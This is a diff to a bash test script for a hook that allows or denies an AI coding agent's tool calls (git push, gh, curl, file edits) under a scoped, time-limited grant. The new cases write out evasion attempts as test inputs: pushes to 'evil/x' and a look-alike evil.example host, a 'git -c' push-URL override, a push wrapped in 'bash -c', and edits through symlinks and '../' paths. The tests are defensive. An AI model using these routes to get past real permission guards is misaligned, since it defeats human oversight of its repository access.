@@ -2,7 +2,7 @@
 # SPDX-License-Identifier: MPL-2.0
 # test-reach-hook.sh: local tests for .machine_readable/svc/k9/reach/reach-hook.sh.
 # Runs the hook against the compiled fixture contracts in ../validate/fixtures/reach/
-# with a fixed clock and a throwaway git checkout. Needs bash, git and jq.
+# with a fixed clock and a throwaway git checkout. Needs bash, git, jq, openssl and flock.
 # Exit 0 when every case behaves as expected, 1 otherwise.
 set -u
 here=$(cd "$(dirname "$0")" && pwd)
@@ -10,7 +10,7 @@ repo=$(cd "$here/../../../.." && pwd)
 hook="$repo/.machine_readable/svc/k9/reach/reach-hook.sh"
 full="$repo/2-protocols/k9-coordination/tools/validate/fixtures/reach/reach-full.json"
 mini="$repo/2-protocols/k9-coordination/tools/validate/fixtures/reach/reach-minimal.json"
-for t in git jq; do command -v "$t" >/dev/null || { echo "needs $t"; exit 2; }; done
+for t in git jq openssl flock; do command -v "$t" >/dev/null || { echo "needs $t"; exit 2; }; done
 work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
 at() { date -u -d "$1" +%s; }
 MON=$(at 2026-11-23T10:00:00Z)   # Monday, inside the window
@@ -35,16 +35,20 @@ cp -r "$co" "$work/src"; mkdir -p "$work/src/src"; echo x >"$work/src/src/x.rs"
 git -C "$work/src" add . && git -C "$work/src" -c user.name=t -c user.email=t@example.invalid commit -q -m src
 
 # run NAME EXPECT(pass|deny) NOW CONTRACT SID JSON [ENV=VALUE...]
+# WHY=TEXT makes a deny case also check that the reason contains TEXT. A hook
+# that exits nonzero fails the case, whatever it printed.
 # State persists per SID inside one test file run, so cases can build on each other.
 run() {
   local name=$1 want=$2 now=$3 contract=$4 sid=$5 json=$6; shift 6
   local sha; sha=$(sha256sum <"$contract" | cut -d' ' -f1)
-  local out; out=$(env -i PATH="$PATH" HOME="$work" K9_REACH_STATE_KEY="${KEY-test-state-key}" K9_REACH_ROLE="${ROLE:-deed-migrator}" \
+  local out rc; out=$(env -i PATH="$PATH" HOME="$work" K9_REACH_STATE_KEY="${KEY-test-state-key}" K9_REACH_ROLE="${ROLE:-deed-migrator}" \
     K9_REACH_JSON_SHA="${SHA:-$sha}" K9_REACH_FILE="$contract" K9_REACH_STATE="$work/state" \
-    K9_REACH_NOW="$now" "$@" bash "$hook" <<<"${json//SID/$sid}")
+    K9_REACH_NOW="$now" "$@" bash "$hook" <<<"${json//SID/$sid}"); rc=$?
   local got=pass; [[ "$out" == *'"permissionDecision":"deny"'* ]] && got=deny
+  [ "$rc" -eq 0 ] || got="exit $rc"
+  [ "$got" = deny ] && [ -n "${WHY:-}" ] && [[ "$out" != *"$WHY"* ]] && got="deny for another reason"
   if [ "$got" = "$want" ]; then pass=$((pass + 1)); echo "ok   $name"
-  else fail=$((fail + 1)); echo "FAIL $name: wanted $want, got ${out:-no output}"; fi
+  else fail=$((fail + 1)); echo "FAIL $name: wanted $want, got $got: ${out:-no output}"; fi
 }
 j() { jq -cn --arg t "$1" --arg c "$2" --argjson i "$3" '{session_id:"SID",cwd:$c,tool_name:$t,tool_input:$i}'; }
 attach() { j mcp__claude-code-remote__add_repo /tmp "{\"owner\":\"${1%%/*}\",\"repo\":\"${1#*/}\",\"access\":\"${2:-push}\"}"; }
@@ -94,6 +98,30 @@ run "curl to api.github.com" deny "$MON" "$full" g11 "$(bash_in /tmp "curl -X PU
 run "wget in a pipe to api.github.com" deny "$MON" "$full" g12 "$(bash_in /tmp "true | wget -qO- https://api.github.com/repos/$G")"
 run "ordinary bash (build)" pass "$MON" "$full" g13 "$(bash_in "$co" 'ls -la && echo done')"
 
+echo "# every simple command, the selected repo, and the pushed refs"
+git -C "$work/src" branch claude/clean HEAD~1
+ln -s ../src "$co/docs/link"
+run "push then merge in one call" deny "$MON" "$full" m1 "$(bash_in "$co" 'git push origin claude/x; gh pr merge 1')"
+run "comment then curl in one call" deny "$MON" "$full" m2 "$(bash_in "$co" 'gh pr comment 1 --body hi && curl https://api.github.com/x')"
+run "build then push in one call" pass "$MON" "$full" m3 "$(bash_in "$co" 'ls && git push origin claude/x')"
+WHY="evil/x not in role" run "gh pr comment --repo evil/x" deny "$MON" "$full" m4 "$(bash_in "$co" 'gh pr comment 1 --repo evil/x --body hi')"
+run "gh pr comment -R on the granted repo" pass "$MON" "$full" m5 "$(bash_in "$co" "gh pr comment 1 -R $G --body hi")"
+run "GH_REPO with a gh action" deny "$MON" "$full" m6 "$(bash_in "$co" 'GH_REPO=evil/x gh pr comment 1 --body hi')"
+WHY="branch main does not match" run "push HEAD:main" deny "$MON" "$full" m7 "$(bash_in "$co" 'git push origin HEAD:main')"
+run "push claude/x:main" deny "$MON" "$full" m8 "$(bash_in "$co" 'git push origin claude/x:main')"
+run "push the local main" deny "$MON" "$full" m9 "$(bash_in "$co" 'git push origin main')"
+run "push to an ungranted URL" deny "$MON" "$full" m10 "$(bash_in "$co" 'git push https://github.com/evil/x claude/x')"
+run "push to a look-alike host" deny "$MON" "$full" m11 "$(bash_in "$co" 'git push https://evil.example/github.com/hyperpolymath/rsr-template-repo claude/x')"
+run "git -c before push" deny "$MON" "$full" m12 "$(bash_in "$co" 'git -c remote.origin.pushurl=https://github.com/evil/x push origin claude/x')"
+run "push inside bash -c" deny "$MON" "$full" m13 "$(bash_in "$co" "bash -c \"git push origin HEAD:main\"")"
+run "push with no arguments" pass "$MON" "$full" m14 "$(bash_in "$co" 'git push')"
+run "push a docs-only branch from another checkout state" pass "$MON" "$full" m15 "$(bash_in "$work/src" 'git push origin claude/clean')"
+WHY="src/x.rs is outside" run "push HEAD (with src/) to claude/clean" deny "$MON" "$full" m16 "$(bash_in "$work/src" 'git push origin HEAD:claude/clean')"
+run "push a tag" deny "$MON" "$full" m17 "$(bash_in "$co" 'git push origin refs/tags/v1')"
+WHY="src/x.rs is outside" run "edit docs/../src/x.rs" deny "$MON" "$full" m18 "$(edit "$co/docs/../src/x.rs")"
+run "edit through a symlink into src/" deny "$MON" "$full" m19 "$(edit "$co/docs/link/x.rs")"
+run "push with a redirect" pass "$MON" "$full" m20 "$(bash_in "$co" 'git push origin claude/x 2>&1')"
+
 echo "# temporal window and validity"
 run "attach on a Saturday" deny "$(at 2026-11-28T10:00:00Z)" "$full" w1 "$(attach hyperpolymath/rsr-template-repo)"
 run "read on a Saturday (scope actions)" pass "$(at 2026-11-28T10:00:00Z)" "$full" w2 "$READ"
@@ -104,6 +132,7 @@ run "attach at 21:00 UTC" deny "$(at 2026-11-23T21:00:00Z)" "$full" w6 "$(attach
 run "attach on a blackout day" deny "$(at 2026-12-01T10:00:00Z)" "$full" w7 "$(attach hyperpolymath/rsr-template-repo)"
 run "read before valid_from" deny "$(at 2026-11-20T10:00:00Z)" "$full" w8 "$READ"
 run "read after expires" deny "$(at 2026-12-22T10:00:00Z)" "$full" w9 "$READ"
+run "hub message after expires" pass "$(at 2026-12-22T10:00:00Z)" "$full" w10 "$MSG"
 
 echo "# time to live, breadth, rate"
 T0=$(at 2026-11-24T08:00:00Z)
@@ -123,7 +152,8 @@ run "push 7 in the hour (rate 6)" deny "$((T0 + 7 * 60))" "$full" t4 "$(bash_in 
 run "attach repo 1 under admin ceiling of 1 repo" pass "$T0" "$full" t5 "$(attach hyperpolymath/rsr-template-repo)" K9_CEIL_REPOS=1
 run "attach repo 2 under admin ceiling of 1 repo" deny "$T0" "$full" t5 "$(attach metadatastician/standards read)" K9_CEIL_REPOS=1
 mkdir -p "$work/state"; jq -cn --argjson t "$T0" '{first:$t,last:$t,calls:800,attaches:0,pushes:0,prs:0,spawns:0,push_times:[],repos:[]}' >"$work/state/t6.json"
-run "call 801 (max 800)" deny "$T0" "$full" t6 "$READ"
+openssl dgst -sha256 -hmac test-state-key -r "$work/state/t6.json" | awk '{print $1}' >"$work/state/t6.json.sig"
+WHY="800 tool calls used up" run "call 801 (max 800)" deny "$T0" "$full" t6 "$READ"
 
 echo "# switches"
 run "breach mode reported in the reason" deny "$MON" "$full" x1 "$(attach evil/x read)"
